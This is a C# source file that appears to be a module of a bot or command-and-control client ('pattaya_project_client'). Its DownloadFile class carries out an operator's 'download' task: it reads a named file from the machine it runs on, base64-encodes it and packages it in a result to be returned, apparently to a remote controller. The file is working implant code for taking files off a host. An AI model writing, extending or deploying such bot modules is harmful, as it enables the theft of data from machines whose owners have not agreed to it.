using pattaya_project_client.Commands.Interfaces;
using pattaya_project_client.Models;
using pattaya_project_client.Utils;
using System;
using System.IO;

namespace pattaya_project_client.Commands.Implements
{
    public class DownloadFile : BotCommand
    {
        public override string TaskName => "download";

        public override BotTaskResult RunTask(BotTask task)
        {
            var arguments = task.Arguments.Split(' ');
            if (arguments is null || arguments.Length == 0 || arguments[0] == "")
            {
                
                return new BotTaskResult
                {
                    TaskId = task.TaskId,
                    Result = "No path provided"
                };
            }

            var targetFile = arguments[0];

            string currentDir = Directory.GetCurrentDirectory();

            // Join paths
            string fullPath = Path.Combine(currentDir, targetFile);

            if (!File.Exists(fullPath))
            {
                

                return new BotTaskResult
                {
                    TaskId = task.TaskId,
                    Result = $"{targetFile} not found"
                };
            }

            if(BotUtil.isFileSizeExceed(fullPath))
            {
                return new BotTaskResult
                {
                    TaskId = task.TaskId,
                    Result = $"{targetFile} size is exeeded (>10MB)...",
                };
            }

            byte[] fileBytes = File.ReadAllBytes(fullPath);


            string base64String = Convert.ToBase64String(fileBytes);

            return new BotTaskResult
            {
                TaskId = task.TaskId,
                Result = $"{targetFile} is Downloading...",
                RespondingFile = base64String,
                RespondingFilename = targetFile
            };
        }
    }
}
